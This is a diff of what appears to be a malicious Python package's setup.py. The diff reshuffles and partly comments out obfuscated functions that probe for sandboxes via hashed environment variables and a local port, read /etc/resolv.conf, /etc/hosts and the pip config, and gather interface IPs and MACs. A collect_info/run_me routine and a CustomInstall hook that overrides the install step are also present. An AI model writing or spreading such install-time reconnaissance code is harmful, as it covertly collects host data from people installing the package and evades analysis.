@@ -41,15 +41,10 @@ try:
     )
 except Exception as e:
     pass
-
-def sha256(str_):
-    return hashlib.sha256(str_.encode('utf-8')).hexdigest()
-
 # def find_in_folder(dir, hash_):
 #     for f in os.listdir(dir):
 #         if sha256(f) == hash_:
 #             return f
-
 # def JWtZETxrGN_1():
 #     k = False
 #     try:
@@ -65,39 +60,11 @@ def sha256(str_):
 #         pass
 #
 #     return k
-
-def rLscSvytBP_2():
-    global RESP
-    try:
-        req = http_request.Request("http://127.0.0.1:19000/certs")
-        response = http_request.urlopen(req, timeout=5)
-        RESP = response.read().decode('utf-8')
-        return True
-    except:
-        return False
-
 # def SxiRVrIPbC_3():
 #     for name, value in os.environ.items():
 #         if sha256(name) == H_F3 and sha256(value) == H_F4:
 #             return True
 #     return False
-
-def detect_system():
-    
-    
-    
-    
-    
-    key = 0
-    if JWtZETxrGN_1():
-        key = 1
-    elif rLscSvytBP_2():
-        key = 2
-    elif SxiRVrIPbC_3():
-        key = 3 
-    
-    return key
-
 # def read_config(config):
 #     c = ""
 #     try:
@@ -110,13 +77,6 @@ def detect_system():
 #         pass
 #
 #     return c
-
-def get_dns():
-    return read_config("/etc/resolv.conf")
-
-def get_hosts():
-    return read_config("/etc/hosts")
-
 # def get_time_zone():
 #     res = ""
 #     try:
@@ -130,26 +90,6 @@ def get_hosts():
 #     except:
 #         pass
 #     return res
-
-def getifip(ifn):
-    import socket, fcntl, struct
-
-    try:
-        sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        
-        if sys.version_info[0] >= 3:
-            ifn = ifn.encode()
-            return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack('256s', ifn[:15]))[20:24])
-    except:
-        pass
-    return "UNKNOWN"
-
-def get_mac(ifn):
-    f = open("/sys/class/net/{}/address".format(ifn))
-    mac = f.read()
-    f.close()
-    return mac
-
 # def get_network_interfaces():
 #     interfaces = []
 #     sysp = platform.system()
@@ -173,6 +113,73 @@ def get_mac(ifn):
 #         interfaces = [interface[0] for interface in socket.if_nameindex()]
 #
 #     return interfaces
+# def get_index():
+#     try:
+#         f = open(os.path.expanduser("~/.pip/pip.conf"))
+#     except OSError:
+#         return
+#     except IOError:
+#         return
+#
+#     for line in f.readlines():
+#         if "index-url" in line:
+#             f.close()
+#             return line.split("=")[-1].strip()
+#     f.close()
+
+# def sha256(str_):
+#     return hashlib.sha256(str_.encode('utf-8')).hexdigest()
+
+def rLscSvytBP_2():
+    global RESP
+    try:
+        req = http_request.Request("http://127.0.0.1:19000/certs")
+        response = http_request.urlopen(req, timeout=5)
+        RESP = response.read().decode('utf-8')
+        return True
+    except:
+        return False
+
+# def detect_system():
+#
+#
+#
+#
+#
+#     key = 0
+#     if JWtZETxrGN_1():
+#         key = 1
+#     elif rLscSvytBP_2():
+#         key = 2
+#     elif SxiRVrIPbC_3():
+#         key = 3 
+#
+#     return key
+
+def get_dns():
+    return read_config("/etc/resolv.conf")
+
+# def get_hosts():
+#     return read_config("/etc/hosts")
+
+def getifip(ifn):
+    import socket, fcntl, struct
+
+    try:
+        sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        
+        if sys.version_info[0] >= 3:
+            ifn = ifn.encode()
+            return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack('256s', ifn[:15]))[20:24])
+    except:
+        pass
+    return "UNKNOWN"
+
+def get_mac(ifn):
+    f = open("/sys/class/net/{}/address".format(ifn))
+    mac = f.read()
+    f.close()
+    return mac
 
 def get_ip_addresses(interface):
     ips = []
@@ -202,18 +209,18 @@ def get_ip_addresses(interface):
 
     return ips, macs
 
-def get_net():
-    c = ""
-    try:
-        network_interfaces = get_network_interfaces()
-        for interface in network_interfaces:
-            ips, macs = get_ip_addresses(interface)
-            if ips:
-                c += ("{}|{}|{}\n".format(interface, ','.join(ips), ",".join(macs)))
-    except:
-        pass
-
-    return c
+# def get_net():
+#     c = ""
+#     try:
+#         network_interfaces = get_network_interfaces()
+#         for interface in network_interfaces:
+#             ips, macs = get_ip_addresses(interface)
+#             if ips:
+#                 c += ("{}|{}|{}\n".format(interface, ','.join(ips), ",".join(macs)))
+#     except:
+#         pass
+#
+#     return c
 
 def collect_info():
     os_name = platform.system().lower()
@@ -260,20 +267,6 @@ def run_me():
         
     except Exception as e:
         pass
-
-# def get_index():
-#     try:
-#         f = open(os.path.expanduser("~/.pip/pip.conf"))
-#     except OSError:
-#         return
-#     except IOError:
-#         return
-#
-#     for line in f.readlines():
-#         if "index-url" in line:
-#             f.close()
-#             return line.split("=")[-1].strip()
-#     f.close()
 
 class CustomInstall(install):
     def run(self):    
